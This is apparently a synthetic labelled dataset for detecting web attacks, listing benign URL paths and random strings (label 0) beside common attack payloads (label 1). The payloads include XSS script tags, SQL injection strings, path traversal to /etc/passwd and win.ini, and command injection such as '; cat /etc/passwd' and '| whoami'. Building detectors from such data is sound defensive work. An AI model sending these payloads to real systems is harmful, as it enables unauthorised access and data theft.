<script>var a=116;alert(a)</script>,1
/register?id=1658,0
yhrQrhjG6NziwPC,0
/checkout?id=5227,0
<script>var a=392;alert(a)</script>,1
/index?id=4059,0
| whoami,1
blog,0
' OR '1'='1,1
/register?session=65637,0
search,0
home,0
admin' --,1
Zp0BTfTw,0
../../../windows/win.ini,1
search,0
/checkout?id=5806,0
<script>var a=472;alert(a)</script>,1
admin'/* bypass */OR 1=1,1
onerror=alert(1),1
' OR 2=4 --,1
/checkout?id=1989,0
<script>var a=360;alert(a)</script>,1
/dashboard?session=93974,0
admin'/* bypass */OR 1=1,1
contact,0
/cart?id=1676,0
<script>var a=676;alert(a)</script>,1
home,0
home,0
about,0
1' o r '1'='1,1
/home?id=4806,0
mvFRRYI2IYAyhNx,0
/checkout?id=5028,0
dashboard,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=245;alert(a)</script>,1
' OR '1'='1,1
RNJKzjKo,0
<script>var a=692;alert(a)</script>,1
' OR '1'='1,1
<script>var a=142;alert(a)</script>,1
settings,0
<script>var a=974;alert(a)</script>,1
| whoami,1
FFMxYFXr,0
/checkout?id=295,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
s E l E c T * f R o M a d m i n,1
1' o r '1'='1,1
/contact?id=2105,0
<script>var a=494;alert(a)</script>,1
admin'/* bypass */OR 1=1,1
search,0
/login?id=4727,0
checkout,0
<script>var a=813;alert(a)</script>,1
' OR 4=5 --,1
/search?session=83694,0
admin' --,1
' OR 1=1 --,1
<script>var a=512;alert(a)</script>,1
/checkout?session=23751,0
<script>var a=271;alert(a)</script>,1
' OR '1'='1,1
/cart?id=3187,0
/login?id=5001,0
NfI60OOIJN,0
' OR '1'='1,1
/contact?session=33113,0
' OR 8=3 --,1
user,0
admin' --,1
' OR 9=9 --,1
blog,0
/user?session=15778,0
/cart?session=10022,0
; cat /etc/passwd,1
/register?id=8543,0
/blog?id=1615,0
s E l E c T * f R o M a d m i n,1
onerror=alert(1),1
; cat /etc/passwd,1
cart,0
aLEe59Bhp6A2LMF,0
<script>var a=256;alert(a)</script>,1
FLs0jppNMC,0
<script>alert(document.cookie)</script>,1
register,0
' OR '1'='1,1
' OR 1=1 --,1
settings,0
HAIn77gxBE,0
search,0
../../../windows/win.ini,1
<script>var a=173;alert(a)</script>,1
' OR 6=6 --,1
contact,0
xfEm7CO9GJVZ,0
' OR 7=5 --,1
' OR '1'='1,1
admin' --,1
/user?id=7565,0
/checkout?session=56151,0
DR86QPf3,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
cart,0
register,0
/blog?id=7011,0
<script>alert(document.cookie)</script>,1
search,0
register,0
/contact?id=8081,0
; cat /etc/passwd,1
admin%00' OR 1=1,1
6WEFHcEqaRdLA3,0
T67PjzQwyBcT,0
register,0
/blog?id=846,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
YgC13szkxs6eFtf,0
<script>var a=491;alert(a)</script>,1
/settings?id=1655,0
/user?session=60056,0
dashboard,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 1=1 --,1
/blog?id=4992,0
/dashboard?id=8318,0
/dashboard?id=7440,0
<script>var a=57;alert(a)</script>,1
profile,0
/search?session=44849,0
5R8nekafTBl90,0
/checkout?id=4381,0
/dashboard?id=8971,0
/profile?id=5052,0
admin'/* bypass */OR 1=1,1
/login?id=4180,0
XAJxChvVrVU,0
' OR 2=5 --,1
/contact?session=33883,0
/home?id=5683,0
about,0
blog,0
| whoami,1
/cart?id=1637,0
onerror=alert(1),1
<script>var a=592;alert(a)</script>,1
<script>var a=501;alert(a)</script>,1
' OR 1=1 --,1
/search?id=9597,0
; cat /etc/passwd,1
' OR 2=9 --,1
fSZsfbMc,0
<script>var a=337;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
<script>var a=633;alert(a)</script>,1
GDZVRTexKplc0Af,0
/about?session=86577,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
3sfACaV4ER,0
search,0
<script>var a=617;alert(a)</script>,1
dashboard,0
/search?id=5379,0
profile,0
41y6PLzg,0
' OR 2=8 --,1
' OR 4=5 --,1
| whoami,1
' OR 1=1 --,1
register,0
javascript:alert(1),1
/profile?id=6760,0
/login?id=2490,0
s E l E c T * f R o M a d m i n,1
' OR 7=1 --,1
settings,0
profile,0
/cart?session=38708,0
/home?id=5532,0
RkVK3fxT96,0
t2g3QJ8fJ3ZqR,0
/user?id=854,0
' OR 1=1 --,1
<script>var a=494;alert(a)</script>,1
<script>var a=645;alert(a)</script>,1
admin%00' OR 1=1,1
/register?session=90973,0
' OR '1'='1,1
/checkout?session=98643,0
/search?id=1566,0
gQMoZLyCuy,0
' OR 2=9 --,1
FDTzULY2,0
/search?id=4026,0
' OR 3=8 --,1
1' o r '1'='1,1
login,0
<script>var a=41;alert(a)</script>,1
<script>var a=709;alert(a)</script>,1
/register?id=5836,0
javascript:alert(1),1
../../../windows/win.ini,1
/home?session=48052,0
/blog?session=64829,0
blog,0
PRV2YB6Ciz87hq,0
javascript:alert(1),1
/register?id=8627,0
q73fcQ81Twfc,0
home,0
admin%00' OR 1=1,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=800;alert(a)</script>,1
; cat /etc/passwd,1
s E l E c T * f R o M a d m i n,1
7VHGLQsXb7xNQ,0
/contact?session=65530,0
../../../windows/win.ini,1
/profile?session=10982,0
s E l E c T * f R o M a d m i n,1
admin'/* bypass */OR 1=1,1
/search?session=57626,0
De6F9Pccmlf,0
cart,0
register,0
7NthyC1Ad8SY,0
admin' --,1
/settings?id=6532,0
contact,0
/cart?session=63838,0
/user?session=17940,0
about,0
/login?id=7372,0
<script>var a=400;alert(a)</script>,1
<script>var a=786;alert(a)</script>,1
/checkout?id=5023,0
EIqEvlPfQBl,0
/contact?id=769,0
onerror=alert(1),1
HoCLAj1F,0
<script>alert(document.cookie)</script>,1
mL1zIYNG,0
PQVFiHczFc,0
onerror=alert(1),1
/dashboard?session=24812,0
/search?id=3368,0
contact,0
../../../windows/win.ini,1
javascript:alert(1),1
/cart?session=51539,0
' OR '1'='1,1
' OR 4=7 --,1
| whoami,1
' OR 6=9 --,1
0ucL93VGGkG,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
ksOI7bXb,0
user,0
/contact?id=7646,0
/contact?session=55948,0
blog,0
checkout,0
/settings?id=4874,0
| whoami,1
' OR 9=2 --,1
' OR 1=1 --,1
onerror=alert(1),1
UMCtjHoubvKC,0
profile,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 9=8 --,1
<script>var a=907;alert(a)</script>,1
register,0
<script>var a=559;alert(a)</script>,1
| whoami,1
a1JNKjP9LeQv91P,0
| whoami,1
admin' --,1
8zgo1xoEos,0
login,0
NxcZLyLyUUe,0
/search?session=86436,0
' OR 5=9 --,1
<script>var a=264;alert(a)</script>,1
<script>var a=306;alert(a)</script>,1
cart,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/profile?session=76875,0
/index?session=42096,0
/register?session=21307,0
/user?session=44219,0
' OR 4=2 --,1
profile,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/home?id=3421,0
login,0
' OR '1'='1,1
; cat /etc/passwd,1
../../../../etc/passwd,1
/login?session=77187,0
<script>alert(document.cookie)</script>,1
contact,0
<script>var a=373;alert(a)</script>,1
<script>var a=344;alert(a)</script>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
settings,0
checkout,0
user,0
s E l E c T * f R o M a d m i n,1
1' o r '1'='1,1
profile,0
admin' --,1
profile,0
user,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
1' o r '1'='1,1
' OR 6=6 --,1
' OR 2=1 --,1
' OR 8=6 --,1
' OR 7=3 --,1
blog,0
/home?session=90241,0
register,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/blog?session=55974,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 1=1 --,1
<script>var a=338;alert(a)</script>,1
../../../windows/win.ini,1
about,0
dashboard,0
8S3Atz5kGPa,0
' OR 1=1 --,1
1' o r '1'='1,1
' OR 4=5 --,1
<script>var a=110;alert(a)</script>,1
jA6x2k8iligzfVe,0
/user?id=2184,0
/home?id=3502,0
' OR 8=8 --,1
S3BbvIv5Ahgb,0
<script>var a=81;alert(a)</script>,1
<script>var a=97;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
<script>var a=60;alert(a)</script>,1
cWL3jC0Hmv,0
uFSidPSimnGN,0
admin' --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
javascript:alert(1),1
' OR 1=5 --,1
../../../windows/win.ini,1
coyxnpLdqN8z,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/profile?session=62141,0
qFW7ifTZTiFJlT2,0
/search?id=4709,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/checkout?id=3343,0
../../../../etc/passwd,1
search,0
/search?id=4497,0
/register?id=2873,0
javascript:alert(1),1
/checkout?id=9298,0
k2Xj3atbGyJ7DV,0
../../../../etc/passwd,1
/user?session=82941,0
/about?session=41531,0
index,0
; cat /etc/passwd,1
' OR 5=9 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 2=3 --,1
/register?id=772,0
onerror=alert(1),1
/user?id=3558,0
/search?session=31904,0
FxaHZ8i4UX,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
s E l E c T * f R o M a d m i n,1
javascript:alert(1),1
/home?id=2795,0
admin'/* bypass */OR 1=1,1
' OR 5=5 --,1
admin' --,1
settings,0
checkout,0
<script>var a=951;alert(a)</script>,1
../../../../etc/passwd,1
admin%00' OR 1=1,1
0m2AAg9F1e,0
/user?session=91546,0
/login?id=1342,0
s E l E c T * f R o M a d m i n,1
<script>var a=368;alert(a)</script>,1
' OR 3=5 --,1
' OR 7=8 --,1
/login?id=1441,0
home,0
' OR 2=6 --,1
<script>var a=164;alert(a)</script>,1
search,0
AXa7Bs0ptKn,0
; cat /etc/passwd,1
' OR 2=3 --,1
| whoami,1
../../../../etc/passwd,1
/cart?id=3993,0
/dashboard?id=9709,0
/about?session=47073,0
/about?id=2686,0
s E l E c T * f R o M a d m i n,1
/settings?id=8170,0
/contact?session=31573,0
fTQnxm8FyFKU,0
' OR 6=1 --,1
' OR '1'='1,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 1=1 --,1
admin%00' OR 1=1,1
/settings?session=44864,0
register,0
admin' --,1
admin' --,1
<script>var a=73;alert(a)</script>,1
admin'/* bypass */OR 1=1,1
' OR 1=9 --,1
checkout,0
' OR 6=5 --,1
/settings?session=57835,0
<script>var a=801;alert(a)</script>,1
admin'/* bypass */OR 1=1,1
/search?id=9444,0
/about?session=58273,0
/settings?id=6424,0
admin%00' OR 1=1,1
contact,0
/blog?id=5455,0
/search?session=93231,0
aILhUI4hg7Af,0
admin' --,1
/cart?id=2318,0
onerror=alert(1),1
checkout,0
<script>var a=633;alert(a)</script>,1
IMwCATAAyY2,0
| whoami,1
/cart?id=778,0
admin'/* bypass */OR 1=1,1
contact,0
' OR 2=8 --,1
' OR '1'='1,1
' OR '1'='1,1
/profile?id=6629,0
<script>var a=933;alert(a)</script>,1
' OR '1'='1,1
about,0
' OR 5=1 --,1
<script>var a=621;alert(a)</script>,1
1' o r '1'='1,1
/register?session=75239,0
about,0
' OR 5=1 --,1
s E l E c T * f R o M a d m i n,1
/home?id=3499,0
NRS4m3BNEQWQ6a,0
qdcQgSf3UwX3aA,0
/blog?session=86242,0
/login?session=19762,0
F03nR7ISPptMF,0
' OR '1'='1,1
blog,0
/blog?id=9552,0
/about?id=2932,0
/about?id=9000,0
/blog?session=16034,0
s E l E c T * f R o M a d m i n,1
' OR 7=6 --,1
' OR 7=7 --,1
' OR 1=3 --,1
/settings?session=85317,0
4rV61yQFl4bWe,0
<script>var a=979;alert(a)</script>,1
/dashboard?id=309,0
/checkout?session=23240,0
<script>var a=133;alert(a)</script>,1
../../../windows/win.ini,1
/login?session=77845,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<script>var a=246;alert(a)</script>,1
home,0
../../../../etc/passwd,1
' OR 9=2 --,1
/about?session=79491,0
admin'/* bypass */OR 1=1,1
/home?session=52852,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
admin'/* bypass */OR 1=1,1
javascript:alert(1),1
<script>var a=879;alert(a)</script>,1
/contact?session=28990,0
<script>var a=995;alert(a)</script>,1
javascript:alert(1),1
admin' --,1
javascript:alert(1),1
' OR 9=9 --,1
<script>var a=135;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
admin'/* bypass */OR 1=1,1
/register?id=3056,0
/profile?id=6626,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
X0mpfyF0DG,0
1ia1CP3oPT,0
/settings?id=7696,0
' OR 1=1 --,1
/search?id=8212,0
' OR 4=8 --,1
admin%00' OR 1=1,1
' OR 7=7 --,1
' OR 4=3 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/settings?id=7722,0
../../../windows/win.ini,1
settings,0
f1H0xNpdnJxj,0
javascript:alert(1),1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
../../../../etc/passwd,1
<script>var a=612;alert(a)</script>,1
/cart?session=46433,0
' OR 1=1 --,1
/checkout?session=39378,0
<script>var a=69;alert(a)</script>,1
| whoami,1
s E l E c T * f R o M a d m i n,1
kHZbP5LC,0
s E l E c T * f R o M a d m i n,1
/register?id=9500,0
RvCduht0,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
javascript:alert(1),1
../../../../etc/passwd,1
/search?id=1532,0
user,0
' OR '1'='1,1
/search?session=25927,0
/search?session=62237,0
; cat /etc/passwd,1
/contact?session=74910,0
' OR '1'='1,1
checkout,0
/login?session=38677,0
s E l E c T * f R o M a d m i n,1
/cart?session=52242,0
' OR '1'='1,1
<script>alert(document.cookie)</script>,1
/user?id=4648,0
9NrdIvOH,0
' OR 2=8 --,1
1' o r '1'='1,1
/checkout?session=51491,0
/settings?id=3100,0
<script>alert(document.cookie)</script>,1
/search?id=1362,0
javascript:alert(1),1
| whoami,1
/contact?id=4902,0
/index?id=4878,0
admin'/* bypass */OR 1=1,1
search,0
rSlSjmCRU,0
<script>var a=435;alert(a)</script>,1
/settings?id=1871,0
<script>var a=962;alert(a)</script>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
../../../windows/win.ini,1
hEkV5xNvoK20w1W,0
<script>var a=314;alert(a)</script>,1
<script>var a=373;alert(a)</script>,1
/settings?session=38599,0
admin'/* bypass */OR 1=1,1
blog,0
<script>var a=24;alert(a)</script>,1
cart,0
' OR 4=8 --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/login?id=2513,0
/index?session=58234,0
<script>var a=676;alert(a)</script>,1
<script>var a=933;alert(a)</script>,1
/register?session=77039,0
' OR 1=1 --,1
/home?session=22264,0
index,0
ivR0fL3sqwSrX7Q,0
' OR 1=4 --,1
' OR 9=2 --,1
/index?session=63752,0
/cart?id=7397,0
<script>var a=405;alert(a)</script>,1
login,0
/blog?session=70083,0
gk4TaLts,0
about,0
<script>alert(document.cookie)</script>,1
<script>var a=861;alert(a)</script>,1
' OR 9=8 --,1
admin%00' OR 1=1,1
<script>var a=340;alert(a)</script>,1
<script>var a=988;alert(a)</script>,1
' OR 8=2 --,1
admin'/* bypass */OR 1=1,1
<script>var a=115;alert(a)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/checkout?id=9283,0
/home?id=2369,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<script>var a=762;alert(a)</script>,1
/checkout?id=3765,0
../../../../etc/passwd,1
/contact?session=86918,0
| whoami,1
user,0
/login?id=9275,0
| whoami,1
admin'/* bypass */OR 1=1,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
onerror=alert(1),1
' OR 4=1 --,1
IkuixiYg,0
kuks8GRp7sKxb,0
search,0
index,0
checkout,0
checkout,0
vlvZPfDxGX8,0
blog,0
javascript:alert(1),1
<script>var a=373;alert(a)</script>,1
login,0
rO2GTpUOyHCXmj,0
admin'/* bypass */OR 1=1,1
<script>var a=457;alert(a)</script>,1
/about?session=77391,0
OcVNgHiVU4nnrAA,0
<script>var a=751;alert(a)</script>,1
' OR 3=5 --,1
/login?id=4356,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/settings?session=32912,0
index,0
/about?id=6211,0
' OR 1=1 --,1
OIQYqslz7GVFhH,0
/home?session=93418,0
' OR 6=5 --,1
' OR 9=6 --,1
' OR 8=5 --,1
profile,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
AXCLLtUXiP0MRO,0
| whoami,1
<script>var a=62;alert(a)</script>,1
' OR 5=2 --,1
checkout,0
checkout,0
' OR '1'='1,1
<script>var a=285;alert(a)</script>,1
; cat /etc/passwd,1
' OR 7=6 --,1
<script>var a=247;alert(a)</script>,1
/login?id=7654,0
Fondypb1p,0
<script>var a=46;alert(a)</script>,1
<script>var a=857;alert(a)</script>,1
/index?session=41174,0
index,0
<script>var a=853;alert(a)</script>,1
javascript:alert(1),1
profile,0
settings,0
1' o r '1'='1,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/home?id=1646,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
1' o r '1'='1,1
z5MbE2eFdf8,0
Omffc8sMfhU8pd,0
profile,0
' OR '1'='1,1
blog,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
admin' --,1
../../../../etc/passwd,1
| whoami,1
admin'/* bypass */OR 1=1,1
/checkout?id=4624,0
3FwLQn05lc,0
/login?session=48914,0
75h6yhuO,0
../../../windows/win.ini,1
' OR 1=1 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/profile?id=7736,0
V2INVVYP6DMTP,0
/register?session=15949,0
/blog?session=31707,0
/contact?id=3850,0
v9S33u0KO2d,0
register,0
lCgJisdt,0
| whoami,1
' OR 6=9 --,1
/home?session=89004,0
<script>var a=474;alert(a)</script>,1
; cat /etc/passwd,1
<script>alert(document.cookie)</script>,1
' OR 9=4 --,1
onerror=alert(1),1
' OR 7=5 --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
settings,0
/contact?session=49744,0
/home?id=1775,0
/settings?id=4697,0
admin%00' OR 1=1,1
' OR 4=2 --,1
s E l E c T * f R o M a d m i n,1
AIUMtXWgw,0
/search?id=2599,0
/profile?id=924,0
javascript:alert(1),1
admin'/* bypass */OR 1=1,1
dashboard,0
<script>var a=378;alert(a)</script>,1
/home?session=20274,0
<script>var a=975;alert(a)</script>,1
/register?session=81303,0
/dashboard?id=7940,0
<script>var a=456;alert(a)</script>,1
/cart?id=9269,0
../../../windows/win.ini,1
/checkout?id=8910,0
../../../windows/win.ini,1
/settings?session=56788,0
/login?session=98586,0
<script>var a=713;alert(a)</script>,1
checkout,0
/about?id=8299,0
user,0
| whoami,1
/contact?id=5660,0
<script>var a=48;alert(a)</script>,1
kUwPI0ciaobySm7,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
nY3PEWNF,0
/login?session=58636,0
/dashboard?id=1382,0
vhdwNQ1MAJh,0
/settings?id=9447,0
' OR 9=7 --,1
' OR 4=7 --,1
checkout,0
dQcKQ4ovqcbY5Z2,0
<script>var a=251;alert(a)</script>,1
login,0
1' o r '1'='1,1
search,0
<script>var a=73;alert(a)</script>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/login?id=1467,0
/index?session=40556,0
/about?id=6585,0
<script>var a=615;alert(a)</script>,1
/profile?id=5041,0
Oy3v2tSHFcytE85,0
admin' --,1
../../../windows/win.ini,1
settings,0
s E l E c T * f R o M a d m i n,1
/dashboard?id=4372,0
/profile?session=45063,0
/home?session=18795,0
3sIYbcz46JCtqG0,0
onerror=alert(1),1
<script>alert(document.cookie)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 9=9 --,1
/search?session=91181,0
../../../../etc/passwd,1
admin'/* bypass */OR 1=1,1
' OR 6=1 --,1
cZG9fF7wcM,0
/checkout?session=36594,0
bdoiqXpbwCa,0
about,0
' OR '1'='1,1
../../../windows/win.ini,1
| whoami,1
' OR 1=7 --,1
' OR 2=7 --,1
/about?id=936,0
/register?session=20852,0
/settings?id=9445,0
/cart?session=49954,0
../../../../etc/passwd,1
8ml0s7HbQR,0
<script>alert(document.cookie)</script>,1
/user?id=6263,0
' OR 1=1 --,1
/index?id=2411,0
checkout,0
/checkout?id=4050,0
/contact?session=38636,0
fNPP5WK8Mr,0
/settings?session=66761,0
index,0
1' o r '1'='1,1
search,0
E1D4jzcb9,0
/dashboard?id=7847,0
/about?id=1318,0
LG9AXrKqwdjQ,0
index,0
/about?id=2333,0
/cart?id=2616,0
Ij3URYLUTK2yP2I,0
javascript:alert(1),1
ogrdgckDJv,0
oYQffdE1zBIi,0
/search?session=17606,0
' OR 4=2 --,1
' OR '1'='1,1
/user?id=9992,0
' OR 8=8 --,1
user,0
' OR 5=1 --,1
dashboard,0
javascript:alert(1),1
s E l E c T * f R o M a d m i n,1
' OR 2=6 --,1
/blog?id=7209,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
KuMsa0YI,0
/home?session=36738,0
' OR '1'='1,1
; cat /etc/passwd,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<script>alert(document.cookie)</script>,1
SDBOVvKFOUxvZ,0
about,0
' OR 9=7 --,1
ThKWce6a,0
<script>var a=714;alert(a)</script>,1
tE4EtgK8,0
javascript:alert(1),1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 6=2 --,1
; cat /etc/passwd,1
<script>var a=581;alert(a)</script>,1
/user?session=59015,0
../../../../etc/passwd,1
/blog?session=13944,0
admin'/* bypass */OR 1=1,1
/checkout?id=62,0
/settings?id=1014,0
about,0
/dashboard?session=11385,0
ASZPCdjWGkC6WD,0
<script>alert(document.cookie)</script>,1
1fhAGpQ1aS,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/dashboard?id=4889,0
/about?session=49198,0
' OR 4=9 --,1
' OR 5=5 --,1
admin%00' OR 1=1,1
/checkout?session=86293,0
8uzsywfIPIMe,0
<script>var a=467;alert(a)</script>,1
admin' --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
1' o r '1'='1,1
' OR 6=2 --,1
<script>var a=501;alert(a)</script>,1
/checkout?id=6529,0
index,0
/home?session=79022,0
SLBzd3yWujc4ZVk,0
| whoami,1
settings,0
' OR 8=5 --,1
blog,0
<script>var a=642;alert(a)</script>,1
<script>var a=853;alert(a)</script>,1
/profile?session=16668,0
rIrfPDbqrkSW,0
bs4HRACBBV,0
<script>var a=162;alert(a)</script>,1
<script>var a=297;alert(a)</script>,1
/blog?id=4545,0
../../../../etc/passwd,1
<script>var a=843;alert(a)</script>,1
/register?id=8698,0
pSR8PYtJ,0
W5BAlImd,0
/user?id=2659,0
' OR 4=9 --,1
onerror=alert(1),1
' OR 2=3 --,1
| whoami,1
/profile?session=57055,0
admin'/* bypass */OR 1=1,1
/blog?session=57108,0
<script>var a=821;alert(a)</script>,1
FDeh6VrZPr,0
| whoami,1
' OR 2=1 --,1
cart,0
<script>var a=24;alert(a)</script>,1
<script>var a=974;alert(a)</script>,1
/register?session=91359,0
home,0
profile,0
z4kVx0lPCE,0
../../../../etc/passwd,1
../../../windows/win.ini,1
dashboard,0
/home?session=37147,0
/contact?session=15554,0
register,0
/profile?session=97659,0
<script>var a=475;alert(a)</script>,1
cart,0
/dashboard?id=3930,0
/user?id=5510,0
' OR 4=3 --,1
uS655vMv6eQWCpW,0
profile,0
/user?session=87575,0
javascript:alert(1),1
search,0
admin' --,1
/register?id=8991,0
61YRWizJHcBvmZQ,0
onerror=alert(1),1
blog,0
user,0
/checkout?id=2939,0
1' o r '1'='1,1
| whoami,1
ofAVIJB9pd,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
checkout,0
/search?session=96818,0
AYMs7fLz,0
onerror=alert(1),1
checkout,0
<script>var a=473;alert(a)</script>,1
jEQJ4Gz0,0
<script>var a=295;alert(a)</script>,1
../../../windows/win.ini,1
/cart?session=84196,0
' OR 8=7 --,1
/about?session=40515,0
/profile?session=80309,0
<script>var a=314;alert(a)</script>,1
' OR 3=5 --,1
' OR 9=4 --,1
/dashboard?session=66227,0
' OR 3=2 --,1
../../../../etc/passwd,1
/contact?id=2932,0
/blog?id=9108,0
' OR 4=5 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 1=1 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
register,0
| whoami,1
' OR 3=9 --,1
admin' --,1
ewAIk06QFLR,0
javascript:alert(1),1
rMAnMUhTo2,0
<script>alert(document.cookie)</script>,1
<script>var a=661;alert(a)</script>,1
profile,0
/settings?id=9462,0
' OR 9=4 --,1
1' o r '1'='1,1
/login?id=363,0
ijSgkcX7U,0
/settings?session=57717,0
onerror=alert(1),1
login,0
contact,0
/checkout?id=6736,0
admin' --,1
' OR '1'='1,1
../../../windows/win.ini,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
contact,0
onerror=alert(1),1
settings,0
../../../../etc/passwd,1
<script>var a=996;alert(a)</script>,1
xnmKyglQgS7x,0
/search?session=51926,0
../../../../etc/passwd,1
<script>var a=57;alert(a)</script>,1
/index?id=880,0
s E l E c T * f R o M a d m i n,1
1RPJOU5B6n8Dbx,0
/settings?session=40110,0
admin' --,1
<script>var a=632;alert(a)</script>,1
R5p4JdDqFYuQ6,0
home,0
' OR 8=2 --,1
/home?session=98962,0
/blog?id=9027,0
' OR 3=7 --,1
| whoami,1
/checkout?id=9811,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/settings?session=85637,0
checkout,0
<script>var a=847;alert(a)</script>,1
/blog?session=91133,0
/register?session=29093,0
../../../../etc/passwd,1
54VmU5Zqh5Ts,0
rhY3C0sHha8AgBS,0
' OR 5=1 --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
onerror=alert(1),1
/login?session=16789,0
blog,0
axri0PUmSXm,0
<script>var a=376;alert(a)</script>,1
/profile?session=27435,0
<script>var a=52;alert(a)</script>,1
; cat /etc/passwd,1
/search?id=6599,0
<script>var a=620;alert(a)</script>,1
/profile?session=81015,0
checkout,0
search,0
<script>alert(document.cookie)</script>,1
<script>var a=136;alert(a)</script>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/login?session=72536,0
../../../../etc/passwd,1
/cart?session=85671,0
; cat /etc/passwd,1
admin'/* bypass */OR 1=1,1
admin%00' OR 1=1,1
admin' --,1
register,0
' OR 1=1 --,1
<script>alert(document.cookie)</script>,1
onerror=alert(1),1
s E l E c T * f R o M a d m i n,1
IugipS2H8EOa1G,0
' OR 1=1 --,1
search,0
/checkout?id=8443,0
admin%00' OR 1=1,1
settings,0
' OR 8=7 --,1
/dashboard?session=32750,0
/blog?session=84411,0
zu9bKaE0ivEHIfr,0
/register?session=94159,0
' OR 9=2 --,1
blog,0
/checkout?session=32527,0
onerror=alert(1),1
/cart?id=5504,0
javascript:alert(1),1
/checkout?session=55283,0
profile,0
' OR 1=1 --,1
blog,0
' OR 7=8 --,1
admin'/* bypass */OR 1=1,1
k4tzCvL7S4,0
Faa1VVwswET,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<script>var a=493;alert(a)</script>,1
javascript:alert(1),1
/register?id=9245,0
contact,0
; cat /etc/passwd,1
0yKbvJzffPqso3Z,0
/user?id=3938,0
../../../windows/win.ini,1
/home?session=61966,0
/blog?id=3570,0
/search?session=49807,0
/register?id=1144,0
/register?session=64104,0
../../../../etc/passwd,1
<script>var a=121;alert(a)</script>,1
h7tlFS3R,0
wmqmh21PaIZ5,0
dashboard,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
s E l E c T * f R o M a d m i n,1
/login?session=29458,0
onerror=alert(1),1
admin' --,1
' OR 5=4 --,1
sxd3PbP4jsxC3,0
' OR 3=8 --,1
/register?id=9022,0
<script>alert(document.cookie)</script>,1
profile,0
<script>var a=691;alert(a)</script>,1
/index?session=50458,0
/blog?session=85278,0
dashboard,0
login,0
fjYgezeyUBqKv,0
../../../../etc/passwd,1
' OR 3=8 --,1
' OR 8=5 --,1
' OR 4=8 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<script>alert(document.cookie)</script>,1
dashboard,0
I3NEmikMg,0
/cart?session=61387,0
/profile?id=1470,0
nQPhJuarF9NMJP,0
search,0
<script>var a=932;alert(a)</script>,1
dashboard,0
../../../../etc/passwd,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
javascript:alert(1),1
search,0
s E l E c T * f R o M a d m i n,1
mHCyuGu8ac,0
index,0
settings,0
user,0
onerror=alert(1),1
<script>var a=263;alert(a)</script>,1
wucZL6FH,0
../../../../etc/passwd,1
about,0
tEQn1TlXZ,0
/cart?id=1024,0
<script>var a=988;alert(a)</script>,1
' OR 2=2 --,1
/contact?id=9284,0
cGHSk8FHZQlsa,0
javascript:alert(1),1
; cat /etc/passwd,1
<script>var a=641;alert(a)</script>,1
| whoami,1
/checkout?session=23963,0
b9iQx7XvDgEKY,0
bgKcj5Aj,0
admin'/* bypass */OR 1=1,1
I6f7wGFzklAj3,0
| whoami,1
1' o r '1'='1,1
/search?session=22567,0
' OR 8=5 --,1
checkout,0
